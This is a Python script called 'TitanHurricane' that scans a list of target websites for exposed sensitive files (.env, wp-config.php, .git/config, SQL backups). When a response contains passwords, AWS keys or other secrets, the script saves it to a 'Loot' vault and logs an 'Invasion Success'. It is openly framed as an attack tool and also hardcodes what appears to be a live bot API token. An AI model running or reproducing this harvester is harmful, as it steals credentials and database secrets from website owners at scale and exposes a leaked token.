import httpx
import asyncio
from rich.console import Console
from rich.progress import track
import os

console = Console()

# --- Configuration & Armory ---
TARGETS_FILE = "targets.txt"
VAULT_PATH = "Data_Vault/Loot/"
TOKEN = "8290479304:AAEA6o56IPfTNb8KJqSfiFXWLVjfU4DjxS0"
SENSITIVE_FILES = [".env", "backup.sql", "config.php", ".git/config", "wp-config.php"]

class TitanHurricane:
    def __init__(self):
        self.targets = self.load_targets()
        self.client = httpx.AsyncClient(timeout=10.0, follow_redirects=True, verify=False)
        if not os.path.exists(VAULT_PATH):
            os.makedirs(VAULT_PATH)

    def load_targets(self):
        if os.path.exists(TARGETS_FILE):
            with open(TARGETS_FILE, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        return []

    async def ant_army_scout(self, url):
        """The Radar & Vacuum System"""
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
            
        for s_file in SENSITIVE_FILES:
            full_url = f"{url.rstrip('/')}/{s_file.lstrip('/')}"
            try:
                response = await self.client.get(full_url)
                if response.status_code == 200 and any(key in response.text.upper() for key in ["DB_", "PASSWORD", "AWS", "SECRET", "KEY", "SELECT"]):
                    console.print(f"[bold green][+] GOLD FOUND:[/] {full_url}")
                    self.save_to_vault(url, s_file, response.text)
            except Exception:
                continue

    def save_to_vault(self, url, file_name, content):
        """The Vault Refinery"""
        safe_name = url.replace("https://", "").replace("http://", "").replace("/", "_")
        path = os.path.join(VAULT_PATH, f"{safe_name}_{file_name.replace('/', '_')}")
        with open(path, "w") as f:
            f.write(content)
        with open("Data_Vault/DIAMONDS.log", "a") as log:
            log.write(f"Invasion Success: {url}/{file_name}\n")

    async def launch(self):
        console.print("[bold red]🚀 TITAN HURRICANE LAUNCHED: ATTACKING TARGETS...[/]")
        # تقسيم العمل لمجموعات (Semaphores) لعدم تعطل النظام
        sem = asyncio.Semaphore(50) 
        
        async def safe_scout(target):
            async with sem:
                await self.ant_army_scout(target)

        tasks = [safe_scout(target) for target in self.targets]
        for _ in track(asyncio.as_completed(tasks), total=len(tasks), description="Ant Army Crawling..."):
            await _

if __name__ == "__main__":
    hurricane = TitanHurricane()
    asyncio.run(hurricane.launch())
